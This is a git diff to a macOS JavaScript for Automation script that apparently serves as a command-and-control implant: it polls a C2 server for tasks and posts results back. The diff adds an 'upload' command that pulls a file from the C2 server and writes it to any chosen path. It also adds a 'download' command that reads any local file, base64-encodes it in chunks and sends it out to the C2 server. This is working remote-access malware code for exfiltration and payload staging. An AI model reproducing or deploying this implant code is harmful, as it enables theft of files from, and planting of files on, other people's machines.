@@ -328,7 +328,27 @@ shell_in_term_tab = function(window, tab, command){
 	}
 	return output;
 }
-
+does_file_exist = function(strPath){
+    var error = $();
+    return $.NSFileManager.defaultManager.attributesOfItemAtPathError($(strPath).stringByStandardizingPath, error), error.code === undefined;
+}
+convert_to_nsdata = function(strData){
+    // helper function to convert UTF8 strings to NSData objects
+    var tmpString = $.NSString.alloc.initWithCStringEncoding(strData, $.NSData.NSUnicodeStringEncoding);
+    return tmpString.dataUsingEncoding($.NSData.NSUTF16StringEncoding);
+}
+write_text_to_file = function(data, file_path){
+    try{
+        var open_file = currentApp.openForAccess(Path(file_path), {writePermission: true});
+        currentApp.setEof(open_file, { to: 0 }); //clear the current file
+        currentApp.write(data, { to: open_file, startingAt: currentApp.getEof(open_file) });
+        currentApp.closeAccess(open_file);
+        return "file written";
+     }
+     catch(error){
+        return "failed to write to file";
+     }
+}
 sleepWakeUp = function(t){
 	var response;
 	console.log("checking for tasking");
@@ -477,8 +497,64 @@ sleepWakeUp = function(t){
 			else if(command == "exit"){
 				$.NSApplication.sharedApplication.terminate(this);
 			}
+			else if(command == "upload"){
+                var split_params = params.split(" ");
+                var url = "api/v1.0/files/" + split_params[0];
+                var file_data = C2.htmlGetData(C2.baseurl + url);
+                var file_path = split_params.slice(1, ).join(" ");
+                var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
+                var file_data = $.NSString.alloc.initWithDataEncoding(decoded_data, $.NSUTF8StringEncoding).js;
+                output = write_text_to_file(file_data, file_path);
+
+			}
+			else if(command == "download"){
+                // download just has one parameter of the path of the file to download
+                if( does_file_exist(params)){
+                    var offset = 0;
+                    var chunkSize = 5000;
+                    var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
+                    // Get the file size by seeking;
+                    var fileSize = handle.seekToEndOfFile;
+                    // always round up to account for chunks that are < chunksize;
+                    var numOfChunks = Math.ceil(fileSize / chunkSize);
+                    var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
+                    registerData = convert_to_nsdata(registerData);
+                    registerFile = C2.postResponse("api/v1.0/responses/" + task.id, registerData);
+                    if (registerFile['status'] == "success"){
+                        handle.seekToFileOffset(0);
+                        var currentChunk = 1;
+                        var data = handle.readDataOfLength(chunkSize);
+
+                        while(data.length > 0 && offset < fileSize){
+                            // send a chunk
+                            var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['id']});
+                            fileData = convert_to_nsdata(fileData);
+                            C2.postResponse("api/v1.0/responses/" + task.id, fileData);
+                            $.NSThread.sleepForTimeInterval(C2.interval);
+
+                            // increment the offset and seek to the amount of data read from the file
+                            offset += data.length;
+                            handle.seekToFileOffset(offset);
+                            currentChunk += 1;
+                            data = handle.readDataOfLength(chunkSize);
+                        }
+                        output = "Finished downloading file with id: " + registerFile['id'];
+                        output += "\nBrowse to /api/v1.0/files/" + registerFile['id'];
+                    }
+                    else{
+                        output = "Failed to register file to download";
+                    }
+                }
+                else{
+                    output = "file does not exist";
+                }
+
+			}
 			else {
 				output = "command not supported: " + command + " " + params;
+			}
+			if ((typeof output) == "string"){
+			    output = convert_to_nsdata(output);
 			}
 			C2.postResponse("api/v1.0/responses/" + task.id, output);
 		}
